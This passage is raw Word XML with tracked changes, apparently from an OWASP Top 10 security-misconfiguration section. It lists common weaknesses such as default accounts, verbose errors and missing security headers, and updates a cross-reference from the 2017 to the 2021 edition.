    <w:p w14:paraId="4D21D1CE" w14:textId="749D5E8E" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> application stack or improperly configured permissions on cloud</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257AB137" w14:textId="2782207E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EED5B9A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E00DDF" w14:textId="39732954" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1835" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-  </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unnecessary features are enabled or installed (e.g</w:t>
      </w:r>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.,</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> unnecessary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0880DF49" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1836" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ports, services, pages, accounts, or privileges).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53029AA2" w14:textId="00453B37" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1837" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1838" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="25F30BA6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1839" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1840" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Default accounts and their passwords </w:t>
      </w:r>
      <w:ins w:id="1841" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">are </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>still enabled and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7812AE20" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1842" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> unchanged.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAF051F" w14:textId="7AFD61A7" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1843" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1844" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="78646E12" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1845" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1846" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Error handling reveals stack traces or other overly informative</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDF9376" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1847" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> error messages to users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F28F77F" w14:textId="6598381B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1848" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1849" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="61ABB6F9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1850" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1851" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> For upgraded systems, </w:t>
      </w:r>
      <w:ins w:id="1852" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>latest security features are disabled or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139767C5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1853" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> not configured securely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3274A6F7" w14:textId="1BAD5660" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1854" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1855" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="403626A0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1856" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1857" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The security settings in the application servers, application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78749A3E" w14:textId="63D7704C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1858" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1859" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> frameworks (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="1860" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1861" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Struts, Spring, ASP.NET), libraries, databases,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4E3FB9" w14:textId="5AFC0221" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1862" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> etc</w:t>
      </w:r>
      <w:del w:id="1863" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1864" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>., are</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> not set to secure values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EF7825" w14:textId="10EA82C2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1865" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1866" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0DE0F86A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1867" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1868" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The server does not send security headers or directives</w:t>
      </w:r>
      <w:ins w:id="1869" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or they are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA6AD3D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1870" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> not set to secure values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3750AF83" w14:textId="0FA70CFE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1871" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1872" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2D6A10D4" w14:textId="19D2A06E" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1873" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The software is out of date or vulnerable (see </w:t>
      </w:r>
      <w:del w:id="1874" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**A9:2017-Using</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1875" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[A06:2021-Vulnerable and Outdated</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Components</w:t>
      </w:r>
      <w:del w:id="1876" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with Known Vulnerabilities**).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1877" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">](A06_2021-Vulnerable_and_Outdated_Components.md)). </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="40615EA6"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78" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59145F7E" w14:textId="7278D31A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
